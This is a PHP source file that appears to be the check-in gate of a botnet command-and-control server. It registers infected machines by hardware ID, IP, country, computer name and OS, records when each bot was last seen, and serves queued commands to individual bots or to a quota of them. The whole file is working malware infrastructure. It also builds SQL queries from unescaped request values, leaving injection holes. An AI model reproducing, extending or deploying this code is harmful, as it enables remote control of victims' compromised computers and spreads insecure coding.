<?php
require_once('config.php');
require_once('geoip.php');

$hwid=null;
$version=null;
$ip=null;
$computer=null;
$os=null;

//get requests
if (isset($_GET['hwid']) && isset($_GET['version']) && isset($_SERVER['REMOTE_ADDR']) && isset($_GET['pc']) && isset($_GET['os'])) {
	$hwid = $_GET['hwid'];
	$version = $_GET['version'];
	$ip	= $_SERVER['REMOTE_ADDR'];
	$computer = $_GET['pc'];
	$os = $_GET['os'];
}

// GeoIP
	$gi 	  = geoip_open('GeoIP.dat',GEOIP_STANDARD); // open database
	$code1 	  = geoip_country_code_by_addr($gi, $ip); // get country
	$code2 	  = geoip_country_name_by_addr($gi, $ip); // get country
	geoip_close($gi); // close databse
		
	$country  	   = strtolower($code1);
	$country_long  = strtolower($code2);
// GeoIP
	  


// exist
$hwid=mysqli_real_escape_string($conn,$hwid);
$first = mysqli_query($conn,"select * from bots where hwid like '$hwid'");


if(mysqli_num_rows($first))//update time so we can see the  last time the bot seen alive
{
	mysqli_query($conn,"update bots set time=now() where hwid like '$hwid'");
}
else // if first time connecting add to botlist 
{
	mysqli_query($conn,"insert into bots (country,countrylong,ip,version,pc,hwid,os) values ('$country', '$country_long','$ip', '$version', '$computer','$hwid','$os')");
}

// check for a specific task for this bot only
$my_tasks = mysqli_query($conn ,"select * from my_tasks where done = 0 and hwid like '%$hwid%'");
if(mysqli_num_rows($my_tasks))
{
	echo "IF RUNNING<br>";
	while($row=mysqli_fetch_assoc($my_tasks))
	{
		$command = $row['command']; // get the command
		echo $command;
		mysqli_query($conn,"UPDATE my_tasks Set done = 1 WHERE command = '$command' and hwid like '%$hwid%'");
		break;
	}
}
else // loop through tasks for all bots
{
	echo "ELSE RUNNING<br>";
	$tasks = mysqli_query($conn,"select * from tasks");
	while($row=mysqli_fetch_assoc($tasks))
	{
		$command = $row['command']; // get the command
		$tasks2 = mysqli_query($conn,"select * from tasks where command like '$command'");
		
		// get info of current comamnd to see if we need to complete the task
		while($row=mysqli_fetch_assoc($tasks2))
		{
			$complete = $row['complete'];
			$wantComplete =$row['wantComplete'];
			$add = $complete+1;
		}
		// if not enough bots of completed the comamnd we will try
		if($complete <= $wantComplete)
		{
			// test to see if we have al ready completed this task 
			$tasksDone = "select * from tasks_done where hwid like '$hwid' and command like '$command'";
			$count = mysqli_query($conn,$tasksDone);
			
			// if we havnt completed the task than print the task to the screen so we can scrape it
			if(!mysqli_num_rows($count))
			{
				echo $command;
				// update tasks list to let it know we have completed it
				mysqli_query($conn,"UPDATE tasks Set complete = '$add' WHERE command = '$command'");			
				mysqli_query($conn,"INSERT INTO tasks_done (hwid,command) VALUES ('$hwid', '$command');");
			}	
		}

		
	}
}



?>